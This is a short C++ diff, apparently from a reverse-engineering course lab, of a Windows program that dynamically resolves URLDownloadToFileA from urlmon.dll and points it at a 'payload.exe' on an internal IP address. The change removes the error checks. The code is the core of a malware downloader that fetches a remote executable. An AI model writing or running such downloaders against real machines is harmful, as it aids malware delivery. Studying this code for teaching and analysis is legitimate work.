@@ -8,18 +8,7 @@ typedef HRESULT(WINAPI* URLDownloadToFileA_t)(LPUNKNOWN pCaller, LPCSTR szURL, L
 int main()
 {
     HMODULE hKernel32 = LoadLibraryA("urlmon.dll");
-    if (hKernel32 == NULL)
-    {
-        cerr << "Failed to load urlmon.dll" << endl;
-        return 1;
-    }
-
     URLDownloadToFileA_t pURLDownloadToFileA = (URLDownloadToFileA_t)GetProcAddress(hKernel32, "URLDownloadToFileA");
-    if (pURLDownloadToFileA == NULL)
-    {
-        cerr << "Failed to get URLDownloadToFileA function address" << endl;
-        return 2;
-    }
 
     //string url = "https://raw.githubusercontent.com/dedkuzmich/reverse2024/main/lab2/payload/payload.exe";
     string url = "http://192.168.1.5:2291/payload.exe";
